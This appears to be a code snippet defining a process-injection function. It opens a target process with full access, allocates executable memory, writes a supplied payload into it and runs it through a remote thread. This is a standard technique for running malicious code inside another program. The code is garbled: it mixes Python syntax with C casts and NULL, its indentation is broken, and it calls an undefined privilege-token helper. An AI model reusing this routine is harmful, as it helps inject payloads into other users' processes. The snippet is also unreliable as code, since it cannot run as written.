    def MpfPiWriteProcessMemoryCreateRemoteThread(Payload, PayloadSizeInBytes, TargetProcessId):

    # Create a handle to the target process
    hHandle = None
    try:
        hHandle = OpenProcess(PROCESS_ALL_ACCESS, False, TargetProcessId)
    except Exception as e:
        print(f"Error opening process {TargetProcessId}: {e}")
        return False

    # Allocate memory in the target process
    BaseAddress = None
    try:
        BaseAddress = VirtualAllocEx(hHandle, None, PayloadSizeInBytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    except Exception as e:
        print(f"Error allocating memory in {TargetProcessId}: {e}")
        return False

    # Set the privilege token for the target process
    try:
        SetProcessPrivilegeToken(0)
    except Exception as e:
        print(f"Error setting privilege token for {TargetProcessId}: {e}")
        return False

    # Write the payload to the allocated memory
    try:
        WriteProcessMemory(hHandle, BaseAddress, Payload, PayloadSizeInBytes, NULL)
    except Exception as e:
        print(f"Error writing to {TargetProcessId}: {e}")
        return False

    # Create a remote thread in the target process
    hThread = None
    try:
        hThread = CreateRemoteThread(hHandle, NULL, 0, (LPTHREAD_START_ROUTINE)BaseAddress, NULL, 0, NULL)
    except Exception as e:
        print(f"Error creating remote thread in {TargetProcessId}: {e}")
        return False

    # Wait for the remote thread to finish
    try:
        WaitForSingleObject(hThread, INFINITE)
    except Exception as e:
        print(f"Error waiting for remote thread in {TargetProcessId}: {e}")
        return False

    # Return flag indicating success
    return True

